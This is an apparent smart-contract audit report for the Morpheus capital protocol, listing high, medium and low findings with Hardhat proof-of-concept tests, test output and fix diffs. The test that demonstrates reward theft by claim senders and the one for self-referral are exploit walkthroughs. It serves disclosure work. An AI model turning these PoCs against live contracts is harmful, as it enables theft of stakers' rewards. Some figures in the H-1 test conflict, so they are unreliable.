# High 

## [H-1] Self-Referral Lets Malicious Users to Unfairly Receive Rewards
### Links
https://github.com/code-423n4/2025-08-morpheus/blob/a65c254e4c3133c32c05b80bf2bd6ff9eced68e2/contracts/capital-protocol/DepositPool.sol#L254

### Finding description
The `DepositPool::stake()` function allows users to stake tokens in the system. In addition, the protocol has implemented a referral system. Because of this, a user is able to also pass in a referrer address to the stake function in order to participate in the referral system.

However, a malicious user is able to simply add their own address and act as their own referrer. This allows them to be able to receive the 1% addition in rewards for being the referee and also additional rewards for being the referrer.

### Impact & Likelihood
**Impact:** High
By setting themselves as their own referrer, a user can inflate their rewards by up to 6% (1% referee bonus + 5% referrer bonus for Tier 3, achieved with ≥ 350 stETH staked). This unfairly reduces the MOR reward pool for legitimate participants, as self-referring users gain additional rewards without contributing to community growth.

**Likelihood:** High
The exploit requires only a single call to `stake` with the user’s own address as `referrer_`, which is straightforward and requires no special conditions or permissions.

### Proof of Concept
The following test can be added to the `POC.test.ts` file. However, does also need an additional import that is specified bellow: 

<details><summary>Code PoC</summary>

```ts
import { getDefaultPool, getDefaultReferrerTiers, oneDay, oneHour } from './helpers/distribution-helper';

it('POC-Audit-4: DepositPool - Self-Referral Reward Manipulation', async function () {
      // Setup reward pool timestamp & Referrer Tiers
      await distributor.setRewardPoolLastCalculatedTimestamp(publicRewardPoolId, 1);
      const referrerTiers = getDefaultReferrerTiers();
      await depositPool.editReferrerTiers(publicRewardPoolId, referrerTiers);

      // Set time to start reward distribution
      await setNextTime(oneDay * 11);

      // Step 1: Alice stakes with self-referral
      const stakeAmount = wei(100); // 100 stETH
      await depositToken.mint(alice.address, stakeAmount);
      await depositToken.connect(alice).approve(depositPool.getAddress(), stakeAmount);
      await depositPool.connect(alice).stake(publicRewardPoolId, stakeAmount, 0, alice.address); // Self-referral
      const aliceData = await depositPool.usersData(alice.address, publicRewardPoolId);
      console.log('Alice deposited:', ethers.formatEther(aliceData.deposited), 'stETH');
      console.log('Alice virtual deposited (self-referral):', ethers.formatEther(aliceData.virtualDeposited), 'stETH');

      // Step 2: Bob stakes without referral for comparison
      await depositToken.mint(bob.address, stakeAmount);
      await depositToken.connect(bob).approve(depositPool.getAddress(), stakeAmount);
      await depositPool.connect(bob).stake(publicRewardPoolId, stakeAmount, 0, ZERO_ADDR); // No referrer
      const bobData = await depositPool.usersData(bob.address, publicRewardPoolId);
      console.log('Bob deposited:', ethers.formatEther(bobData.deposited), 'stETH');
      console.log('Bob virtual deposited (no referral):', ethers.formatEther(bobData.virtualDeposited), 'stETH');

      // Step 3: Check referrer data for Alice
      const referrerData = await depositPool.referrersData(alice.address, publicRewardPoolId);
      console.log('Alice referrer virtual amount staked:', ethers.formatEther(referrerData.virtualAmountStaked), 'stETH');

      // Step 4: Validate exploit
      // Assume _getUserTotalMultiplier gives 1% bonus for referee (1.01x) and _applyReferrerTier gives 3% for Tier 0
      const expectedAliceVirtual = stakeAmount * 101n / 100n; // 1% referee bonus
      const expectedBobVirtual = stakeAmount; // No bonus
      const expectedAliceReferrerBonus = stakeAmount *3n / 100n; // 2.5% Tier 0 bonus
      expect(aliceData.virtualDeposited).to.equal(expectedAliceVirtual, 'Alice should get 1% referee bonus');
      expect(bobData.virtualDeposited).to.equal(expectedBobVirtual, 'Bob should get no bonus');
      expect(referrerData.virtualAmountStaked).to.equal(wei(2.5), 'Alice’s referrer data should track her stake');
      console.log('Exploit: Alice gains 1% referee bonus and 2.5% referrer bonus by self-referring');
    });
```

</details><br>

Output from running the test:

<details><summary>Output</summary>

```zsh
  Morpheus Capital Protocol - POC Test Suite
    POC Templates
Alice deposited: 100.0 stETH
Alice virtual deposited (self-referral): 101.0 stETH
Bob deposited: 100.0 stETH
Bob virtual deposited (no referral): 100.0 stETH
Alice referrer virtual amount staked: 2.5 stETH
Exploit: Alice gains 1% referee bonus and 3% referrer bonus by self-referring
      ✔ POC-Audit-4: DepositPool - Self-Referral Reward Manipulation (53ms)


  1 passing (2s)
```
</details><br>

**Explanation:**
- Alice stakes 100 stETH with herself as the referrer, gaining a 1% referee bonus (`virtualDeposited = 101 stETH`).
- Her `referrersData.virtualAmountStaked` is set to 2.5 stETH, reflecting a 2.5% referrer bonus for Tier 0, allowing her to claim additional `MOR` rewards via `claimReferrerTier`.
- Bob stakes 100 stETH without a referrer, receiving no bonus (`virtualDeposited = 100 stETH`).
- The exploit demonstrates that Alice unfairly gains a total of 3.5% extra rewards (1% + 2.5%) without referring others. For larger stakes (≥ 350 stETH), this could increase to 6% (1% + 5% for Tier 3).

### Recommendation
Add a check that either reverts if someone put themselves as the referrer or perhaps changes it back to `address(0)`.

Example:
<details><summary>Diff</summary>

```diff
function _stake(
    address user_,
    uint256 rewardPoolIndex_,
    uint256 amount_,
    uint256 currentPoolRate_,
    uint128 claimLockEnd_,
    address referrer_
) private {
    require(isMigrationOver == true, "DS: migration isn't over");
+   require(referrer_ != _msgSender(), "DS: cannot self-refer"); 
    // ...
}
```
</details><br>

## [H-2] Claim Senders Can Steal the Stakers Rewards
### Links
https://github.com/code-423n4/2025-08-morpheus/blob/a65c254e4c3133c32c05b80bf2bd6ff9eced68e2/contracts/capital-protocol/DepositPool.sol#L294

### Finding description
The protocol allows users to add addresses that could claim the rewards on their behalf, but these senders do not receive the rewards they only call claim to get the rewards back to the original staker. The staker will call the `DepositPool::setClaimSender` function to do so. 

The issue arises as the're are not enough checks to make sure that the arbitrary receiver is permissioned. 

A user that has been added to the claim senders can call `DepositPool::claimFor` and put any address in the `receiver_` parameter. This can happen if the staker has not set a receiver address using the `DepositPool::setClaimReceiver` function. 

Here is a walkthrough of the checks:
1. Checking if staker has set a receiver address.
2. If so we set the receiver. So far so good.
3. If staker has not set a receiver we make sure the caller is allowed to claim on behalf of staker. This is ok but should really be checked regardless.
4. No other checks for arbitrary receiver. And claiming continues. 

<details><summary>Code Snippet</summary>

```solidity
function claimFor(uint256 rewardPoolIndex_, address staker_, address receiver_) external payable {
        // 1.
        if (claimReceiver[rewardPoolIndex_][staker_] != address(0)) {
        // 2. 
            receiver_ = claimReceiver[rewardPoolIndex_][staker_];
        } else {
        // 3. 
            require(claimSender[rewardPoolIndex_][staker_][_msgSender()], "DS: invalid caller");
        }

        // 4. 
        _claim(rewardPoolIndex_, staker_, receiver_); 
    }
```

</details><br>

### Impact & Likelihood
**Impact:** High
This vulnerability allows sender claimers to steal the rewards from the stakers. This functionality is only intended to claim the rewards on behalf of staker and for the rewards to be sent to staker. Stealing of another users funds!

**Likelihood:** Medium
Not all users will use the senders functionality and this can be prevented if they do set a receiver. However, if they allow senders without specified receiver all their rewards are at risk. 

### Proof of Concept
This PoC lacks the showing of balance movement. This is because of the way the mock of the `LayerZeroEndPointV2Mock` is structured. It did not match the actual contract and kept causing issues like this output:

<details><summary>Sample output of issue</summary>

```zsh
  1) Morpheus Capital Protocol - POC Test Suite
       POC Templates
         POC-1: DepositPool - Bob claims rewards on behalf of alice even if not receiver:
     Error: Transaction reverted: function selector was not recognized and there's no fallback function
```

</details><br>

In order to make the PoC pass I had to go into the `LayerZeroEndPointV2Mock` and place an empty but correctly structured `send` function (as used in the `L1Sender` contract). This was left empty as it took to much time to do this myself and it does need doing to prove the point of the exploit:

<details><summary>Code Snippet</summary>

```solidity
    function send(
        uint16 _dstChainId,
        bytes calldata _destination,
        bytes calldata _payload,
        address payable _refundAddress,
        address _zroPaymentAddress,
        bytes calldata _adapterParams
    ) external payable {
    }
```

</details><br>

Here is the PoC that shows the exploit. Can be added in `POC.test.ts`:

<details><summary>Code PoC</summary>

```ts
    it('POC-1: DepositPool - Bob claims rewards on behalf of alice even if not receiver', async function () {
      // Setup reward pool timestamp (required before any staking)
      await distributor.setRewardPoolLastCalculatedTimestamp(publicRewardPoolId, 1);
      
      // Setting up L1Sender:
      await l2MessageReceiver.setParams(mor, {
        gateway: lzEndpointL1,
        sender: l1Sender,
        senderChainId: l1ChainId,
      });

      await l1Sender.setLayerZeroConfig({
        gateway: lzEndpointL1,
        receiver: l2MessageReceiver,
        receiverChainId: l2ChainId,
        zroPaymentAddress: ZERO_ADDR,
        adapterParams: '0x',
      });
      await l1Sender.setDistributor(distributor);

      // Set time to start reward distribution
      await setNextTime(oneDay * 11);

      // 1. Alice stakes tokens
      await depositPool.connect(alice).stake(publicRewardPoolId, wei(100), 0, ZERO_ADDR);
      await depositPool.connect(alice).lockClaim(publicRewardPoolId, oneDay * 18);

      // 2. Alice adds Bob to be a claim sender but not receive. Meaning Bob can claim rewards ob Alice's behalf but not receive the rewards. Alice does not set a receiver.
      const sendersList: Array<AddressLike> = [bob.address];
      const allowedList: Array<boolean> = [true];
      await depositPool.connect(alice).setClaimSender(publicRewardPoolId, sendersList, allowedList);

      // Fast forward time
      await setNextTime(oneDay * 19);
      // Making sure Alice has some rewards
      const aliceData = await depositPool.usersData(alice.address, publicRewardPoolId);
      expect(aliceData.pendingRewards).to.not.equal(0, 'No rewards for Alice');

      // 3. Bob calls `claimFor` but leaves himself as the receiver
      await depositPool.connect(bob).claimFor(publicRewardPoolId, alice, bob, { value: wei(0.1) } );
    });
```

</details><br>

This is passing. Which indicates that, at no point, the protocol stops this behavior. 

### Recommendation
Add more checks to make sure that the arbitrary receiver parameter is correct. Another option would be that if staker has not specified receiver, we put the stakers address instead. Which eliminates the arbitrary receiver in the first place, which I recommend. Also make sure that the check for sender is done for all scenarios:

```diff
- function claimFor(uint256 rewardPoolIndex_, address staker_, address receiver_) external payable {
+ function claimFor(uint256 rewardPoolIndex_, address staker_) external payable {
+       require(claimSender[rewardPoolIndex_][staker_][_msgSender()], "DS: invalid caller");
+
        if (claimReceiver[rewardPoolIndex_][staker_] != address(0)) {
            receiver_ = claimReceiver[rewardPoolIndex_][staker_];
        } else {
+           receiver_ = staker_
-           require(claimSender[rewardPoolIndex_][staker_][_msgSender()], "DS: invalid caller");
        }

        _claim(rewardPoolIndex_, staker_, receiver_); 
    }
}
```

# Medium

## [M-1] Missing `roundId` vs. `answeredInRound` Check on Chainlink Feed
### Finding description
The `getChainLinkDataFeedLatestAnswer` function does not verify that `answeredInRound >= roundId`, risking the use of stale price data if the oracle’s round updates are delayed.

The function, as of now, does validate the allowed time for `block.timestamp` and that the `answer` is positive and non zero. However, it is considered best practice to check that the `answeredInRound` is not stale. This check is not utilised in the function.

### Impact & Likelihood
- **Impact:**
Stale data could lead to stale pricing and could affect the correct operation of the protocol and user funds.

Therefore, deemed as HIGH.

- **Likelihood:**
There are some checks the exist already that could potentially catch most issues. However, these checks fail to cover everything. 

Therefore, deemed as LOW. 

### Proof of Concept
Paste the following test in the POC.test.ts test suite:

<details><summary>Code PoC</summary>

```ts
    it('POC: ChainLinkDataConsumer - Stale Price Data Accepted Due to Missing roundId vs. answeredInRound Check', async function () {
      // Set allowed price update delay
      await chainLinkDataConsumer.setAllowedPriceUpdateDelay(3600); // 1 hour

      // Step 1: Configure the ETH/USD feed to return stale data
      const currentTime = await getCurrentBlockTime();
      const initialPrice = wei(2000, 18); // $2000/ETH
      const stalePrice = wei(1000, 18); // Stale price from an earlier round

      // Set a valid initial price for the current round
      await ethUsdFeed.setAnswerResult(initialPrice);
      await ethUsdFeed.setUpdated(currentTime);
      await ethUsdFeed.setRoundData(2, initialPrice, currentTime, currentTime, 2); // roundId=2, answeredInRound=2

      // Step 2: Simulate a new round with no answer update (stale data)
      await ethUsdFeed.setRoundData(3, stalePrice, currentTime - 1800, currentTime - 1800, 1); // roundId=3, answeredInRound=1
      await ethUsdFeed.setUpdated(currentTime - 1800); // Within allowedPriceUpdateDelay (3600 seconds)

      // Step 3: Fetch price from ChainLinkDataConsumer
      const pathId = await chainLinkDataConsumer.getPathId('ETH/USD');
      const price = await chainLinkDataConsumer.getChainLinkDataFeedLatestAnswer(pathId);

      // Step 4: Validate the vulnerability
      // The contract should return 0 or revert due to stale data (answeredInRound < roundId), but it returns the stale price
      expect(price).to.equal(stalePrice, 'ChainLinkDataConsumer accepted stale price data');
      console.log('ETH/USD price (stale):', ethers.formatEther(price), 'USD');
      console.log('Expected behavior: Contract should revert or return 0 due to answeredInRound < roundId');

      // Step 5: Demonstrate correct behavior with fresh data
      await ethUsdFeed.setRoundData(4, initialPrice, currentTime, currentTime, 4); // Fresh data: roundId=4, answeredInRound=4
      await ethUsdFeed.setUpdated(currentTime);
      const freshPrice = await chainLinkDataConsumer.getChainLinkDataFeedLatestAnswer(pathId);
      expect(freshPrice).to.equal(initialPrice, 'ChainLinkDataConsumer returned correct price for fresh data');
      console.log('ETH/USD price (fresh):', ethers.formatEther(freshPrice), 'USD');
    });
```

</details><br>

This best practice is also described in the following well known X thread which describes best practices: https://x.com/saxenism/status/1656632744279982080

In addition in the following finding found in the `Tigris Trade` contest:
https://solodit.cyfrin.io/issues/m-24-chainlink-price-feed-is-not-sufficiently-validated-and-can-return-stale-price-code4rena-tigris-trade-tigris-trade-contest-git

### Recommendation
Update the `Distributor::updateDepositTokensPrices` function so it also makes sure the answer that was received is not stale:

<details><summary>Diff</summary>

```diff
function getChainLinkDataFeedLatestAnswer(bytes32 pathId_) external view returns (uint256) {
    ...Code Snip...
-   try aggregator_.latestRoundData() returns (uint80, int256 answer_, uint256, uint256 updatedAt_, uint80) 
+   try aggregator_.latestRoundData() returns (uint80 roundId, int256 answer_, uint256, uint256 updatedAt_, uint80 answeredInRound) {
        if (answer_ <= 0) {
            return 0;
        }

+       if (answeredInRound < roundId) {
+           return 0;
+       }

        if (block.timestamp < updatedAt_ || block.timestamp - updatedAt_ > allowedPriceUpdateDelay) {
            return 0;
        }

        ...Code Snip...
    }
    ...Code Snip...
}
```

</details><br>

## [M-2] Withdraw Lock Period Resets Block Earlier Stakes in `DepositPool`
### Links
https://github.com/code-423n4/2025-08-morpheus/blob/a65c254e4c3133c32c05b80bf2bd6ff9eced68e2/contracts/capital-protocol/DepositPool.sol#L451

https://github.com/code-423n4/2025-08-morpheus/blob/a65c254e4c3133c32c05b80bf2bd6ff9eced68e2/contracts/capital-protocol/DepositPool.sol#L422

### Finding description
The `DepositPool::_withdraw` function enforces the lock period for user withdrawal set by the owner for the appropriate public reward pool:

<details><summary>Code Snippet</summary>

```solidity
function _withdraw(address user_, uint256 rewardPoolIndex_, uint256 amount_, uint256 currentPoolRate_) private {
    ..Snip..

    if (IRewardPool(IDistributor(distributor).rewardPool()).isRewardPoolPublic(rewardPoolIndex_)) {
        require(
            block.timestamp > userData.lastStake + rewardPoolProtocolDetails.withdrawLockPeriodAfterStake,
                "DS: pool withdraw is locked"
            );
        ..Snip..
    }
    ..Snip..
}
```

</details><br>

The issue arises when a user happens to stake for a second time. The `userData.lastStake` is updated to be the `block.timestamp` in the `_stake` function every time a user stakes. This causes a reset of the lock period for their entire portfolio in the same reward pool. 

### Impact & Likelihood
**Impact::** Medium
If a user happens to stake a second time without withdrawing their original stake, they will have to wait a second time for their stake. This can cause users to provide less liquidity or have less faith in the protocol.

**Likelihood:** Medium
Any user that happens to stake another amount before their withdrawal, will have to wait until their second stake has finished. Probably not be a case for every user.

### Proof of Concept
The following PoC can be pasted in the `POC.test.ts` file:

<details><summary>Code PoC</summary>

```ts
it('POC-Audit-5: DepositPool - withdrawLockPeriodAfterStake Blocks Previous Stakes', async function () {
      // Step 1: Setup reward pool with 7-day withdraw lock
      await distributor.setRewardPoolLastCalculatedTimestamp(publicRewardPoolId, 1);
      const withdrawLockPeriod = 7 * oneDay; // 7 days
      await depositPool.setRewardPoolProtocolDetails(publicRewardPoolId, withdrawLockPeriod, 0, 0, wei(10)); // 10 stETH min stake

      // Set initial time
      const startTime = oneDay * 11;
      await setNextTime(startTime);

      // Step 2: Alice stakes 100 stETH at T=0
      const stakeAmount1 = wei(100); // 100 stETH
      await depositToken.mint(alice.address, stakeAmount1);
      await depositToken.connect(alice).approve(depositPool.getAddress(), stakeAmount1);
      await depositPool.connect(alice).stake(publicRewardPoolId, stakeAmount1, 0, ZERO_ADDR);
      const aliceData1 = await depositPool.usersData(alice.address, publicRewardPoolId);
      console.log('Alice initial stake:', ethers.formatEther(aliceData1.deposited), 'stETH');
      console.log('Alice lastStake timestamp:', aliceData1.lastStake.toString());

      // Step 3: Advance to T=5 days, Alice stakes 50 stETH
      const stakeAmount2 = wei(50); // 50 stETH
      await setNextTime(startTime + 5 * oneDay);
      await depositToken.mint(alice.address, stakeAmount2);
      await depositToken.connect(alice).approve(depositPool.getAddress(), stakeAmount2);
      await depositPool.connect(alice).stake(publicRewardPoolId, stakeAmount2, 0, ZERO_ADDR);
      const aliceData2 = await depositPool.usersData(alice.address, publicRewardPoolId);
      console.log('Alice total stake after second stake:', ethers.formatEther(aliceData2.deposited), 'stETH');
      console.log('Alice lastStake timestamp after second stake:', aliceData2.lastStake.toString());

      // Step 4: At T=7 days, attempt to withdraw 100 stETH (should fail)
      await setNextTime(startTime + 7 * oneDay);
      await expect(
        depositPool.connect(alice).withdraw(publicRewardPoolId, stakeAmount1)
      ).to.be.revertedWith('DS: pool withdraw is locked');
      console.log('Alice withdrawal of 100 stETH at T=7 days: Reverted (lock active)');

      // Step 5: At T=13 days, attempt to withdraw 100 stETH (should succeed)
      await setNextTime(startTime + 13 * oneDay);
      const balanceBefore = await depositToken.balanceOf(alice.address);
      await depositPool.connect(alice).withdraw(publicRewardPoolId, stakeAmount1);
      const balanceAfter = await depositToken.balanceOf(alice.address);
      console.log('Alice withdrawal of 100 stETH at T=13 days:', ethers.formatEther(balanceAfter - balanceBefore), 'stETH');

      // Step 6: Bob stakes 100 stETH at T=0, withdraws at T=7 days (control)
      await depositToken.mint(bob.address, stakeAmount1);
      await depositToken.connect(bob).approve(depositPool.getAddress(), stakeAmount1);
      await depositPool.connect(bob).stake(publicRewardPoolId, stakeAmount1, 0, ZERO_ADDR);
      await setNextTime(startTime + 21 * oneDay); // After 7 days past
      const bobBalanceBefore = await depositToken.balanceOf(bob.address);
      await depositPool.connect(bob).withdraw(publicRewardPoolId, stakeAmount1);
      const bobBalanceAfter = await depositToken.balanceOf(bob.address);
      console.log('Bob withdrawal of 100 stETH at T=7 days:', ethers.formatEther(bobBalanceAfter - bobBalanceBefore), 'stETH');

      // Step 7: Validate
      const aliceDataFinal = await depositPool.usersData(alice.address, publicRewardPoolId);
      expect(aliceDataFinal.deposited).to.equal(stakeAmount2, 'Alice should have 50 stETH remaining');
      console.log('Vulnerability: Alice’s initial 100 stETH locked until T=13 days due to second stake');
    });
```

</details><br>

Output:

<details><summary>Output of Test</summary>

```zsh
  Morpheus Capital Protocol - POC Test Suite
    POC Templates
Alice initial stake: 100.0 stETH
Alice lastStake timestamp: 950402
Alice total stake after second stake: 150.0 stETH
Alice lastStake timestamp after second stake: 1382402
Alice withdrawal of 100 stETH at T=7 days: Reverted (lock active)
Alice withdrawal of 100 stETH at T=13 days: 100.0 stETH
Bob withdrawal of 100 stETH at T=7 days: 100.0 stETH
Exploit: Alice’s initial 100 stETH locked until T=13 days due to second stake
      ✔ POC-Audit-5: DepositPool - withdrawLockPeriodAfterStake Blocks Previous Stakes (97ms)


  1 passing (2s)
```

</details><br>

### Recommendation
Modify the `_stake` and `_withdraw` functions to track lock periods per stake rather than per user. One approach is to store a list of stakes with their timestamps and amounts, checking each stake’s lock period during withdrawal. Alternatively, allow partial withdrawals for stakes whose lock periods have expired:

<details><summary>Code Fix</summary>

```solidity
function _stake(...) private {
    // Store stake details
    userData.stakes.push(Stake({amount: amount_, timestamp: uint128(block.timestamp)}));
    // ...
}

function _withdraw(address user_, uint256 rewardPoolIndex_, uint256 amount_, uint256 currentPoolRate_) private {
    // ...
    uint256 withdrawable = 0;
    for (uint256 i = 0; i < userData.stakes.length; i++) {
        if (block.timestamp > userData.stakes[i].timestamp + rewardPoolProtocolDetails.withdrawLockPeriodAfterStake) {
            withdrawable += userData.stakes[i].amount;
        }
    }
    require(withdrawable >= amount_, "DS: insufficient withdrawable amount");
    // ...
}
```

</details><br>

## [M-3] No Mechanism to Handle High Utilization Rate in Aave Pool Can Lead to Temporal DoS of Withdrawal
### Links
https://github.com/code-423n4/2025-08-morpheus/blob/a65c254e4c3133c32c05b80bf2bd6ff9eced68e2/contracts/capital-protocol/Distributor.sol#L322

### Finding description
The `Distributor` contract handles all interactions between Deposit Pools and Aave pools. It lets a user stake to/withdraw from a Deposit Pool that supplies that stake to an Aave pool. 

The issue arises when the Aave pool has a high utilization rate, and will block any attempts and withdrawing funds. In addition, a bad actor can front-run a withdrawal and borrow a large amount from the same Aave pool to block the uses, effectively DoSing the withdrawing functionality.

### Impact & Likelihood
**Impact:** Medium
This will DoS users from withdrawing for a temporary time. Aave do have some mechanisms to help making sure these situations do not happen, but still this can happen.

**Likelihood:** Medium
The chances this happens by chance is quite low, however a bad actor can make this happen themselves with some preparation.

### Proof of Concept
This test shows the walkthrough of the vulnerability. As this is a mocked situation the revert does not happen. This is just to help demonstrate the issue:

<details><summary>Code PoC</summary>

```ts
it('POC-1: Distributor - Aave Utilization Rate Check', async function () {
      // Using aave strategy pools scenario
      const { depositToken2, depositPool2, aToken } = await setupComplexScenario();
      const week = 7 * oneDay;

      // Setup reward pool timestamp (required before any staking)
      await distributor.setRewardPoolLastCalculatedTimestamp(publicRewardPoolId, 1);
      // Setting up rewards pool details for new deposit pool with aave strategy
      await depositPool2.setRewardPoolProtocolDetails(publicRewardPoolId, week, week, 0, wei(10));
      // Setting up no min distributing time for continence. 
      await distributor.setMinRewardsDistributePeriod(0);

      // 1. Mocking aave supply
      await depositToken2.mint(aavePool.getAddress(), wei(1000)); // Simulate pool liquidity
      await aToken.mint(depositPool2.getAddress(), wei(100)); // Simulate Aave supply

      // 2. Alice stakes tokens (this internally calls supply on distributor)
      const startTime = oneDay * 11;
      const aliceLockTime = startTime + week;
      await setNextTime(startTime);
      await depositToken2.mint(alice, wei(100));
      await depositToken2.connect(alice).approve(depositPool2, wei(100));
      await depositPool2.connect(alice).stake(publicRewardPoolId, wei(100), aliceLockTime, ZERO_ADDR);

      // Fast forward time to accumulate rewards
      await setNextTime(startTime + aliceLockTime + oneDay);

      // Balances after stake
      console.log('Aave Pool deposit token balance after alice stake: ', await depositToken2.balanceOf(aavePool.getAddress()));
      console.log('Aave Pool atoken balance after alice stake: ', await aToken.balanceOf(aavePool.getAddress()));
      console.log('Distributor deposit token balance after alice stake: ', await depositToken2.balanceOf(distributor.getAddress()));
      console.log('Distributor atoken balance after alice stake: ', await aToken.balanceOf(distributor.getAddress()));

      // 3. Calculate utilization rate
      const poolBalance = await depositToken2.balanceOf(aavePool.getAddress());
      const totalSupply = await aToken.totalSupply();
      const estimatedBorrowed = totalSupply > poolBalance ? totalSupply - poolBalance : 0;
      const utilizationRate = totalSupply == BigInt(0) ? BigInt(0) : BigInt(estimatedBorrowed) * (wei(1)) / (totalSupply);
      console.log('Pool depositToken2 balance: ', poolBalance);
      console.log('aToken totalSupply: ', totalSupply);
      console.log('Estimated Borrowed: ', estimatedBorrowed);
      console.log('Utilization rate: ', utilizationRate);

      // At this stage there is 0% util rate so happy withdrawing continues. Lets try and change that
      // 4. Simulate high utilization

      // Impersonate aave pool
      await network.provider.request({
        method: "hardhat_impersonateAccount",
        params: [await aavePool.getAddress()],
      });

      // // Fund the impersonated account with ETH for gas
      await network.provider.send("hardhat_setBalance", [
        await aavePool.getAddress(),
        "0x1000000000000000000", // 1 ETH
      ]);

      const aavePoolSigner = await ethers.getSigner(await aavePool.getAddress());
      await depositToken2.connect(aavePoolSigner).transfer(alice, wei(1000)); // Just to simulate a withdraw of funds alice did not exploit this
      const highPoolBalance = await depositToken2.balanceOf(aavePool.getAddress());
      const highEstimatedBorrowed = totalSupply - highPoolBalance;
      const highUtilizationRate = totalSupply == BigInt(0) ? BigInt(0) : BigInt(highEstimatedBorrowed) * (wei(1)) / (totalSupply);
      console.log('High Utilization - Pool depositToken2 balance: ', highPoolBalance);
      console.log('High Utilization - Utilization Rate: ', highUtilizationRate);

      // Stop impersonating the account
      await network.provider.request({
        method: "hardhat_stopImpersonatingAccount",
        params: [await aavePool.getAddress()],
      });

      // Distribute rewards
      await distributor.distributeRewards(publicRewardPoolId);

      // 5. Now we try to withdraw
      await depositPool2.connect(alice).withdraw(publicRewardPoolId, wei(100));

      console.log('Aave Pool deposit token balance after all: ', await depositToken2.balanceOf(aavePool.getAddress()));
      console.log('Aave Pool atoken balance after all: ', await aToken.balanceOf(aavePool.getAddress()));
      console.log('Distributor deposit token balance after all: ', await depositToken2.balanceOf(distributor.getAddress()));
      console.log('Distributor atoken balance after all: ', await aToken.balanceOf(distributor.getAddress()));
      console.log('Alice deposit token balance after all: ', await depositToken2.balanceOf(alice));
      console.log('Alice atoken balance after all: ', await aToken.balanceOf(alice));
    });
```

</details><br>

This vulnerability is mentioned in the Solodit Checklist as well as such:
```txt
A high utilization rate can potentially mean that there aren't enough assets in the pool to allow users to withdraw their collateral.

Ensure that there are mechanisms to handle user withdrawal when the utilization rate is high.
```

For a similar finding, can read here: https://solodit.cyfrin.io/issues/m-06-denial-of-liquidations-and-redemptions-by-borrowing-all-reserves-from-aave-code4rena-ethos-reserve-ethos-reserve-contest-git

### Recommendation
I am unaware of a definitive fix for this issue. I did read that using LIFO could reduce the risk. However, there are no other "catches" from withdrawing from Aave. So also consider adding a `catch/try`. 

## [M-4] Staking Rewards Are Not Earned Unless `DepositPool::lockClaim()` Is Called
### Links
https://github.com/code-423n4/2025-08-morpheus/blob/a65c254e4c3133c32c05b80bf2bd6ff9eced68e2/contracts/capital-protocol/Distributor.sol#L330

### Finding description
The protocol allows users to stake their `stETH` in order to gain rewards in return. The users interact with the `DepositPool` contract and it interacts with the `Distributor` contract. The combination of both contracts logic updates state for reward balances and more.

The issue arises when a user stakes their `stETH` and leaves it. The impression would be that each time `Distributor::distributeRewards` is called it will update rewards for the state of the pool. Then the `DepositPool::_getCurrentPoolRate` is called and used to calculate new rate and rewards of the reward pool. However, no update to `userData.pendingRewards` occurs. This leaves the user with 0 rewards. 

Unless, they call `lockClaim` which fixes that situation, but not all users will do that, nor does it claim to do so in the docs. Here is the docs definition of the `DepositPool::stake` function:

```txt
The stake function allows users to deposit stETH into the protocol from the Ethereum network, then the staker will get a share of the rewards. 
```

### Impact & Likelihood
**Impact:** Medium
No loss of funds occur and users are still able to earn rewards if they call `lockClaim`. However, users that only stake regularly will not earn rewards.

**Likelihood:** Medium
Every time a users only calls stake they will suffer from lack of rewards. But some users will choose to lock claim and will not face an issue.

### Proof of Concept
This test can be added to the `POC.test.ts` test suite:

<details><summary>Code PoC</summary>

```ts
it('POC-Latest: DepositPool - Staking Rewards Are Not Earned Unless lockClaim Is Called', async function () {
    // Time set up
    const startTime = oneDay * 11;
    const week = oneDay * 7;
    const aliceLockTime = startTime + week;
    const bobStartTime = startTime + week + oneDay;

    // Setup reward pool timestamp (required before any staking)
    await distributor.setRewardPoolLastCalculatedTimestamp(publicRewardPoolId, 1);

    // Set time to start reward distribution
    await setNextTime(startTime);

    // Alice stakes tokens
    await depositPool.connect(alice).stake(publicRewardPoolId, wei(100), 0, ZERO_ADDR);
    // Alice is the only user to lock claim 
    await depositPool.connect(alice).lockClaim(publicRewardPoolId, aliceLockTime);

    // Fast forward time for alice to get some rewards
    await setNextTime(bobStartTime);
    await distributor.distributeRewards(publicRewardPoolId);

    // Bob stakes but does not lock their claim
    await depositPool.connect(bob).stake(publicRewardPoolId, wei(100), 0, ZERO_ADDR);

    // Accrue some rewards for bob - which will actually not 
    await setNextTime(bobStartTime + week);
    await distributor.distributeRewards(publicRewardPoolId);

    const aliceData = await depositPool.usersData(alice.address, publicRewardPoolId);
    const bobData = await depositPool.usersData(bob.address, publicRewardPoolId);
    console.log('Alice deposited:', aliceData.deposited.toString());
    console.log('Alice virtual deposited:', aliceData.virtualDeposited.toString());
    console.log('Alice pending rewards:', aliceData.pendingRewards.toString());
    console.log('Bob pending rewards:', bobData.pendingRewards.toString());
    });
```

</details><br>

Output:

<details><summary>Output</summary>

```zsh

  Morpheus Capital Protocol - POC Test Suite
    POC Templates
Alice deposited: 100000000000000000000
Alice virtual deposited: 100000000000000000000
Alice pending rewards: 1145833333333333
Bob pending rewards: 0
      ✔ POC-Latest: DepositPool - Staking Rewards Are Not Earned Unless lockClaim Is Called (53ms)


  1 passing (3s)
```

</details><br>

### Recommendation
Consider adding a way for `Distributor::distributeRewards` to update the state for `userData` that is stored in the `DepositPool` contract. One option would be to have `Distributor::distributeRewards` call a function inside `DepositPool` that will do the state updates. Another option is to have stake call `DepositPool::lockClaim` and add an option for 0 for lock and do the update that way. 

# Low

## [L-1] Missing Distribution of Rewards Will Cause Retrieval of False Rewards in `DepositPool::getLatestUserReward`
### Links
https://github.com/code-423n4/2025-08-morpheus/blob/a65c254e4c3133c32c05b80bf2bd6ff9eced68e2/contracts/capital-protocol/DepositPool.sol#L681

### Finding description
The `DepositPool::getLatestUserReward` function allows users to see their rewards. In order to get the rewards the function calls the private function `_getCurrentPoolRate`. The issue is that before calling `_getCurrentPoolRate` the `Distributor` contract needs to distribute rewards using the `distributeRewards` function. This distribution does not happen in the `getLatestUserReward` function. As this is simply a view function there is no harm to the rewards, just presenting false information.

### Impact & Likelihood
**Impact:** Low
As there is not harm to funds this is a low impact issue.

**Likelihood:** High
This will happen every time the `getLatestUserReward` is called. 

### Recommendation
Add the `Distributor::distributeRewards` function to make sure the correct rewards are displayed:

<details><summary>Diff</summary>

```diff
function getLatestUserReward(uint256 rewardPoolIndex_, address user_) public view returns (uint256) {
        if (!IRewardPool(IDistributor(distributor).rewardPool()).isRewardPoolExist(rewardPoolIndex_)) {
            return 0;
        }

        UserData storage userData = usersData[user_][rewardPoolIndex_];

+       IDistributor(distributor).distributeRewards(rewardPoolIndex_); 
